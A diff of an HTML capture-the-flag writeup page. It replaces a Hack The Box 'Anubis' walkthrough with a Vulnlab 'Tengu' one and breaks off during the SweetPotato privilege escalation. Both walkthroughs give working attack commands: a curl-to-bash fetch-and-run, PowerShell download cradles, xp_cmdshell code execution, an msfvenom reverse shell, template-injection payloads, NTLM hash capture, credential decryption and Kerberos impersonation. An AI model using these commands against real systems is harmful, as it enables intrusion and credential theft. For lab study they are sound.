@@ -9,24 +9,26 @@
     <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Anubis</title>
-    <meta name="title" content="Anubis">
-    <meta name="description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+    <title>Tengu</title>
+    <meta name="title" content="Tengu">
+    <meta name="description" content="IPs: 10.10.180.37 10.10.180.38 10.10.180.39">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://eljayright.github.io/writeups/htb/anubis/">
+    <link rel="canonical" href="https://eljayright.github.io/writeups/vulnlab/tengu/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://eljayright.github.io/writeups/htb/anubis/">
-    <meta property="og:title" content="Anubis">
-    <meta property="og:description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/vulnlab/tengu/">
+    <meta property="og:title" content="Tengu">
+    <meta property="og:description" content="IPs: 10.10.180.37 10.10.180.38 10.10.180.39">
+    <meta property="og:image" content="https://eljayright.github.io/writeups/vulnlab/tengu/images/tengu.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://eljayright.github.io/writeups/htb/anubis/">
-    <meta property="twitter:title" content="Anubis">
-    <meta property="twitter:description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/vulnlab/tengu/">
+    <meta property="twitter:title" content="Tengu">
+    <meta property="twitter:description" content="IPs: 10.10.180.37 10.10.180.38 10.10.180.39">
+    <meta property="twitter:image" content="https://eljayright.github.io/writeups/vulnlab/tengu/images/tengu.png">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -35,7 +37,6 @@
     <script data-cfasync="false" src="../../../resources/js/config.js?v=3.6.0.782557455461" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.6.0.782557455461" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.6.0.782557455461" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -178,325 +179,270 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="anubis" class="break-words">
+<doc-anchor-target id="tengu" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#anubis">#</doc-anchor-trigger>
-        <span>Anubis</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#tengu">#</doc-anchor-trigger>
+        <span>Tengu</span>
     </h1>
 </doc-anchor-target>
-<p>Fun AD box, starts with Template Injection which leads to landing in a docker container. From here there is a pivot to an internal web app which can be manipulated to leak a users NTLMv2 hash. This hash cracks and the user can authenticate to SMB where there is a vulnerable version of Jamovi running which allows for a XSS to RCE CVE. The final step is abusing ESC4 to get Administrator on the box.</p>
-<doc-anchor-target id="enumeration">
+<p><figure class="content-center">
+    <img src="images/tengu.png" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>IPs: <code v-pre>10.10.180.37</code> <code v-pre>10.10.180.38</code> <code v-pre>10.10.180.39</code></p>
+<doc-anchor-target id="recon">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
-        <span>Enumeration</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#recon">#</doc-anchor-trigger>
+        <span>Recon</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="nmap">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
-        <span>Nmap</span>
-    </h2>
-</doc-anchor-target>
+<p>Nmap:
+10.10.180.37 DC.tengu.vl</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 14:30 AEDT
-Nmap scan report for 10.10.11.102
-Host is up (0.0058s latency).
-Not shown: 996 filtered tcp ports (no-response)
-PORT    STATE SERVICE       VERSION
-135/tcp open  msrpc         Microsoft Windows RPC
-443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_ssl-date: 2024-03-29T04:31:12+00:00; +1h00m00s from scanner time.
-| tls-alpn: 
-|_  http/1.1
-|_http-server-header: Microsoft-HTTPAPI/2.0
-| ssl-cert: Subject: commonName=www.windcorp.htb
-| Subject Alternative Name: DNS:www.windcorp.htb
-| Not valid before: 2021-05-24T19:44:56
-|_Not valid after:  2031-05-24T19:54:56
-|_http-title: Not Found
-445/tcp open  microsoft-ds?
-593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<pre class="language-none"><code v-pre class="language-none">3389/tcp open  ms-wbt-server Microsoft Terminal Services</code></pre>
+</doc-codeblock></div>
+<p>10.10.180.38 SQL.tengu.vl</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">3389/tcp open  ms-wbt-server Microsoft Terminal Services</code></pre>
+</doc-codeblock></div>
+<p>10.10.180.39</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+1880/tcp open  vsat-control</code></pre>
+</doc-codeblock></div>
+<p>Looking at port 1880 it is running node-red</p>
+<doc-anchor-target id="domain-foothold">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#domain-foothold">#</doc-anchor-trigger>
+        <span>Domain Foothold</span>
+    </h1>
+</doc-anchor-target>
+<p>What we can do is add an exec block and send a revshell:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">curl  http://10.8.0.110:8080/shell.sh | bash</code></pre>
+</doc-codeblock></div>
+<p>Looking at the home directory there are 2 localusers:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">labadmin
+nodered_svc</code></pre>
+</doc-codeblock></div>
+<p>As this box can hit kerberos and ldap we can use chisel to set up a socks tunnel and see if the svc user is roastable.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">local: ./chisel server --reverse --socks5
+remote: ./chisel client 10.8.0.110:8080 R:socks</code></pre>
+</doc-codeblock></div>
+<p>Going to kick off another nmap scan on the host, running this via a proxy will take forever.</p>
+<p>SQL:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s
+3389/tcp open  ms-wbt-server</code></pre>
+</doc-codeblock></div>
+<p>DC:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">53/tcp   open  domain
+88/tcp   open  kerberos
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd
+593/tcp  open  unknown
+636/tcp  open  ldaps
+3389/tcp open  ms-wbt-server</code></pre>
+</doc-codeblock></div>
+<p>Both users are not in ldap.</p>
+<p>As nodered is able to connect to mssql it has to have the credentials somewhere.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">nodered_svc@nodered:/opt/nodered/.node-red$ cat flows_cred.json 
+{
+&quot;$&quot;: &quot;7f5ab122acc2c24df1250a302916c1a6QT2eBZTys+V0xdb7c6VbXMXw2wbn/Q3r/ZcthJlrvm3XLJ8lSxiq+FAWF0l3Bg9zMaNgsELXPXfbKbJPxtjkD9ju+WJrZBRq/O40hpJzWoKASeD+w2o=&quot;
+}</code></pre>
+</doc-codeblock></div>
+<p>There is a decrypt script: <code v-pre>https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/</code> using this we can decrypt the file:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">ls -la content/
+-rw-r--r-- 1 eljay eljay  134 Oct 17 19:27 .config.runtime.json
+-rw-r--r-- 1 eljay eljay  160 Oct 17 19:25 flows_cred.json
+$ ./decrypt.sh content/
+{&quot;d237b4c16a396b9e&quot;:{&quot;username&quot;:&quot;nodered_connector&quot;,&quot;password&quot;:&quot;DreamPuppyOverall25&quot;}}</code></pre>
+</doc-codeblock></div>
+<p>logging in and enumerating the db we find hashed creds for a domain user:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">t2_m.winters:af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147</code></pre>
+</doc-codeblock></div>
+<p>This hash cracks to <code v-pre>Tengu123</code>!</p>
+<p>Using this account we can ssh in and su as root.</p>
+<doc-anchor-target id="pivot-to-sql">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#pivot-to-sql">#</doc-anchor-trigger>
+        <span>Pivot to SQL</span>
+    </h1>
+</doc-anchor-target>
+<p>Going to run bloodhound.</p>
+<p>Analyising the results shows a few interesting things; the linux server can read the gmsa password. This account can then be delegated for mssql service tickets.</p>
+<p>With this in mind we can get system on the sql server.</p>
+<p>Grabbing and decrypting the keytab file:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">root@nodered:/etc# base64 krb5.keytab -w 0
+BQIAAAA3AAEACFRFTkdVLlZMAAhOT0RFUkVEJAAAAAFmAnxfAgAXABDUIQ7i2wwDqjYRye+KTb9JAAAAAgAAADcAAQAIVEVOR1UuVkwACE5PREVSRUQkAAAAAWYCfF8CABEAED4EthuTn2EBjSwn1NwLOF8AAAACAAAARwABAAhURU5HVS5WTAAITk9ERVJFRCQAAAABZgJ8XwIAEgAgTOEcWAKJIn84+MwCJUViJJQdUl0eUlw1PqHh7IMTgJYAAAACAAAAPAACAAhURU5HVS5WTAAEaG9zdAAHTk9ERVJFRAAAAAFmAnxfAgAXABDUIQ7i2wwDqjYRye+KTb9JAAAAAgAAADwAAgAIVEVOR1UuVkwABGhvc3QAB05PREVSRUQAAAABZgJ8XwIAEQAQPgS2G5OfYQGNLCfU3As4XwAAAAIAAABMAAIACFRFTkdVLlZMAARob3N0AAdOT0RFUkVEAAAAAWYCfF8CABIAIEzhHFgCiSJ/OPjMAiVFYiSUHVJdHlJcNT6h4eyDE4CWAAAAAgAAAEkAAgAIVEVOR1UuVkwAEVJlc3RyaWN0ZWRLcmJIb3N0AAdOT0RFUkVEAAAAAWYCfF8CABcAENQhDuLbDAOqNhHJ74pNv0kAAAACAAAASQACAAhURU5HVS5WTAARUmVzdHJpY3RlZEtyYkhvc3QAB05PREVSRUQAAAABZgJ8XwIAEQAQPgS2G5OfYQGNLCfU3As4XwAAAAIAAABZAAIACFRFTkdVLlZMABFSZXN0cmljdGVkS3JiSG9zdAAHTk9ERVJFRAAAAAFmAnxfAgASACBM4RxYAokifzj4zAIlRWIklB1SXR5SXDU+oeHsgxOAlgAAAAI=
 
-Host script results:
-| smb2-time: 
-|   date: 2024-03-29T04:30:34
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled and required
-|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
+python3 /opt/keytabextract.py krb.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : TENGU.VL
+        SERVICE PRINCIPAL : NODERED$/
+        NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
+        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
+        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f</code></pre>
+</doc-codeblock></div>
+<p>Requesting the gmsa account and delegating a ticket for administrator</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nxc ldap dc.tengu.vl -u nodered\$ -H d4210ee2db0c03aa3611c9ef8a4dbf49 --gmsa
+SMB         224.0.0.1       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
+LDAPS       224.0.0.1       636    DC               [+] tengu.vl\nodered$:d4210ee2db0c03aa3611c9ef8a4dbf49 
+LDAPS       224.0.0.1       636    DC               [*] Getting GMSA Passwords
+LDAPS       224.0.0.1       636    DC               Account: gMSA01$              NTLM: 876f2b245d0a3cb526cbed78eee39f65
+
+proxychains getST.py -spn mssqlsvc/sql.tengu.vl -hashes :876f2b245d0a3cb526cbed78eee39f65 -impersonate Administrator tengu.vl/gMSA01\$
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@mssqlsvc_sql.tengu.vl@TENGU.VL.ccache
 </code></pre>
 </doc-codeblock></div>
-<p>dns name:</p>
+<p>The login to mssql:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">www.windcorp.htb</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="smb">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#smb">#</doc-anchor-trigger>
-        <span>SMB</span>
-    </h2>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">netexec smb 10.10.11.102
-SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)</code></pre>
-</doc-codeblock></div>
-<p>domain name and hostname.</p>
-<doc-anchor-target id="https">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#https">#</doc-anchor-trigger>
-        <span>HTTPS</span>
-    </h2>
-</doc-anchor-target>
-<p>Some people which could be mapped to usernames:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-c"><code v-pre class="language-c">walter white
-sarah jhonson
-william anderson
-amanda jepson</code></pre>
-</doc-codeblock></div>
-<p>reflected content on the submit form.</p>
-<p>Trying ssti and it errors!</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">${{&lt;%[%'&quot;}}%\.</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="foothold---template-injection">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold---template-injection">#</doc-anchor-trigger>
-        <span>Foothold - Template Injection</span>
-    </h1>
-</doc-anchor-target>
-<p>As its an asp page I&#x27;m going to try vbs</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">&lt;%= CreateObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll() %&gt;</code></pre>
-</doc-codeblock></div>
-<p>This works and shows that we are running as system. Checking this hostname against what we got from netexec.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">&lt;%= CreateObject(&quot;WScript.Shell&quot;).exec(&quot;hostname&quot;).StdOut.ReadAll() %&gt;</code></pre>
-</doc-codeblock></div>
-<p>This outputs as webserver01 so its probs a container or something.</p>
-<p>Going to use a tcp one liner to get a reverse shell. <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a></p>
-<p>Hosting the file locally then downloading it with an iex cradle.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">&quot;powershell iex (New-Object Net.WebClient).downloadString('http://10.10.14.4/shell.ps1')&quot;</code></pre>
-</doc-codeblock></div>
-<p>This gives us a shell !</p>
-<doc-anchor-target id="foothold---enumeration">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold---enumeration">#</doc-anchor-trigger>
-        <span>Foothold - Enumeration</span>
-    </h1>
-</doc-anchor-target>
-<p>On The administrators desktop there is a certificate</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">-----BEGIN CERTIFICATE REQUEST-----
-MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
-ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
-Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
-KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
-BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
-eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
-QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
-qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
-1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
-JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
-WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
-yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
-F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
-CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
-4TlwpQ==
------END CERTIFICATE REQUEST-----</code></pre>
-</doc-codeblock></div>
-<p>Analysing the cert with openssl shows another hostname:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">softwareportal.windcorp.htb</code></pre>
-</doc-codeblock></div>
-<p>Running nslookup on the host shows it resolves to 172.22.96.1, which is the gateway (again showing this is a docker container).</p>
-<p>Next step is to drop chisel and set up a pivot.</p>
-<p>chisel on the attack machine:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">./chisel server --socks5 --reverse --port 8000</code></pre>
-</doc-codeblock></div>
-<p>chisel on the windows box:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">.\chisel.exe client 10.10.14.4:8000 R:socks</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="internal-webapp">
-    <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#internal-webapp">#</doc-anchor-trigger>
-        <span>Internal WebApp</span>
-    </h1>
-</doc-anchor-target>
-<p>quick port scan shows that smb and http are open:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">proxychains -q nmap -p 445,80,8080,443,21 -sT 172.22.96.1 -oA logs/internal-initial
-Nmap scan report for 172.22.96.1
-Host is up (0.034s latency).
+<pre class="language-none"><code v-pre class="language-none">KRB5CCNAME=$(pwd)/administrator\@mssqlsvc_sql.tengu.vl\@TENGU.VL.ccache proxychains mssqlclient.py -k sql.tengu.vl
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/libproxychains4.so
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 
-PORT     STATE  SERVICE
-21/tcp   closed ftp
-80/tcp   open   http
-443/tcp  closed https
-445/tcp  open   microsoft-ds
-8080/tcp closed http-proxy</code></pre>
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  sql.tengu.vl:1433  ...  OK
+[*] Encryption required, switching to TLS
+[-] ERROR(SQL): Line 1: Login failed for user 'TENGU\administrator'.</code></pre>
 </doc-codeblock></div>
-<p>curling the website shows that there is an install.asp page that expects an ip.</p>
+<p>Going to try again but with <code v-pre>t1.w_winters</code></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">http://softwareportal.windcorp.htb/install.asp?client=172.22.101.175&amp;software=gimp-2.10.24-setup-3.exe</code></pre>
-</doc-codeblock></div>
-<p>Going to start responder and then send a request with the ip pointing to my machine. This works and gives back a hash:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">[WinRM] NTLMv2 Client   : 10.10.11.102
-[WinRM] NTLMv2 Username : windcorp\localadmin
-[WinRM] NTLMv2 Hash     : localadmin::windcorp:1122334455667788:2F5087D589FDB6A8F79B9BCDC1F09B5A:010100000000000059988EEA9D81DA018E750516C919CC6C0000000002000800590030004C004C0001001E00570049004E002D004300520030004B0044004F004E00370051004B00340004001400590030004C004C002E004C004F00430041004C0003003400570049004E002D004300520030004B0044004F004E00370051004B0034002E00590030004C004C002E004C004F00430041004C0005001400590030004C004C002E004C004F00430041004C000800300030000000000000000000000000210000520F2E7E1C4160A6FE8A94802A1835344DED28584F2BE20E14CD43039F88E3E00A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0034000000000000000000</code></pre>
-</doc-codeblock></div>
-<p>This cracks with hashcat to give <code v-pre>Secret123</code>. Using this we can now enumerate smb.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">netexec smb 10.10.11.102 -u localadmin -p Secret123 --shares
-SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.102    445    EARTH            [+] windcorp.htb\localadmin:Secret123 
-SMB         10.10.11.102    445    EARTH            [*] Enumerated shares
-SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
-SMB         10.10.11.102    445    EARTH            -----           -----------     ------
-SMB         10.10.11.102    445    EARTH            ADMIN$                          Remote Admin
-SMB         10.10.11.102    445    EARTH            C$                              Default share
-SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
-SMB         10.10.11.102    445    EARTH            IPC$            READ            Remote IPC
-SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share 
-SMB         10.10.11.102    445    EARTH            Shared          READ            
-SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share </code></pre>
-</doc-codeblock></div>
-<p>There is the CertEnroll share which means ADCS is installed which means certipy.</p>
-<doc-anchor-target id="adcs-enumeration">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#adcs-enumeration">#</doc-anchor-trigger>
-        <span>ADCS Enumeration</span>
-    </h2>
-</doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">proxychains -q certipy find -enabled -u localadmin@windcorp.htb -p Secret123 -dns-tcp -dc-ip 172.22.96.1 -text -stdout
-Certificate Authorities
-  0
-    CA Name                             : windcorp-CA
-    DNS Name                            : earth.windcorp.htb
-    Certificate Subject                 : CN=windcorp-CA, DC=windcorp, DC=htb
+<pre class="language-none"><code v-pre class="language-none">KRB5CCNAME=$(pwd)/t1_m.winters\@MSSQLSvc_SQL.tengu.vl\@TENGU.VL.ccache proxychains mssqlclient.py -k sql.tengu.vl
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/libproxychains4.so
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 
-&lt;snip&gt;
-Certificate Templates
-  0
-    Template Name                       : Web
-    Display Name                        : Web
-    Certificate Authorities             : windcorp-CA
-    Enabled                             : True
-    Client Authentication               : False
-    Enrollment Agent                    : False
-    Any Purpose                         : False
-    Enrollee Supplies Subject           : True
-    Certificate Name Flag               : EnrolleeSuppliesSubject
-    Enrollment Flag                     : PublishToDs
-    Private Key Flag                    : 16842752
-    Extended Key Usage                  : Server Authentication
-    Requires Manager Approval           : False
-    Requires Key Archival               : False
-    Authorized Signatures Required      : 0
-    Validity Period                     : 10 years
-    Renewal Period                      : 6 weeks
-    Minimum RSA Key Length              : 2048
-    Permissions
-      Enrollment Permissions
-        Enrollment Rights               : WINDCORP.HTB\Domain Admins
-                                          WINDCORP.HTB\Enterprise Admins
-      Object Control Permissions
-        Owner                           : WINDCORP.HTB\Administrator
-        Full Control Principals         : WINDCORP.HTB\webdevelopers
-        Write Owner Principals          : WINDCORP.HTB\Domain Admins
-                                          WINDCORP.HTB\Enterprise Admins
-                                          WINDCORP.HTB\Administrator
-                                          WINDCORP.HTB\webdevelopers
-        Write Dacl Principals           : WINDCORP.HTB\Domain Admins
-                                          WINDCORP.HTB\Enterprise Admins
-                                          WINDCORP.HTB\Administrator
-                                          WINDCORP.HTB\webdevelopers
-        Write Property Principals       : WINDCORP.HTB\Domain Admins
-                                          WINDCORP.HTB\Enterprise Admins
-                                          WINDCORP.HTB\Administrator
-                                          WINDCORP.HTB\webdevelopers
-&lt;snip&gt;</code></pre>
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  sql.tengu.vl:1433  ...  OK
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL): Line 1: Changed database context to 'master'.
+[*] INFO(SQL): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (TENGU\t1_m.winters  dbo@master)&gt; </code></pre>
 </doc-codeblock></div>
-<p>There is a template for web where the webdevelopers have write propery over the certificate, meaning we can modify the cert to allow user authentication. As it already has EnrolleeSuppliesSubject we can specify any user.</p>
-<p>Going to dump ldap to see what users are in the webdevelopers group.</p>
+<p>We can also run xp_cmdshell which means rce! Checking the privileges of the user account shows that we also have seimpersonate which means we can get system.</p>
+<p>Going to use a tcprevshell for the initial access then sweatpotato for the privesc:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">proxychains ldapsearch -D localadmin@windcorp.htb -w 'Secret123' -H ldap://172.22.96.1 -s sub -b 'DC=windcorp,DC=htb' &gt; ldap.dmp
-cat ldap.dmp | grep -E dis.*web -B 5
-dn: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb
-objectClass: top
-objectClass: group
-cn: webdevelopers
-member: CN=Diego Cruz,OU=MainOffice,DC=windcorp,DC=htb
-distinguishedName: CN=webdevelopers,OU=Development,DC=windcorp,DC=htb</code></pre>
+<pre class="language-none"><code v-pre class="language-none">SQL (TENGU\t1_m.winters  dbo@master)&gt; xp_cmdshell powershell.exe -c &quot;curl http://10.8.0.110:8080/shell.ps1 -UseBasicParsing | iex&quot; </code></pre>
 </doc-codeblock></div>
-<p>So we need to get to the Diego Cruz user.</p>
-<doc-anchor-target id="jamovi-xss-cve">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#jamovi-xss-cve">#</doc-anchor-trigger>
-        <span>Jamovi XSS CVE</span>
-    </h2>
-</doc-anchor-target>
-<p>Going back to smb and checking the shared folder, there is a file called <code v-pre>Whatif.omv</code> that seems to be being updated.</p>
-<p>Downloading and unzipping the file shows that the file is created by jamovi 1.6.16.0 which has a xss to rce CVE: <a href="https://github.com/g33xter/CVE-2021-28079">https://github.com/g33xter/CVE-2021-28079</a></p>
-<p>Running the exploit gives us a shell as <code v-pre>diegocruz</code>. :D</p>
-<doc-anchor-target id="esc4">
+<p>Creating a quick revshell with msfvenom:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.110 LPORT=9001 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</code></pre>
+</doc-codeblock></div>
+<p>Then firing the exploit:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\sweetpotato.exe -p C:\windows\tasks\shell.exe
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
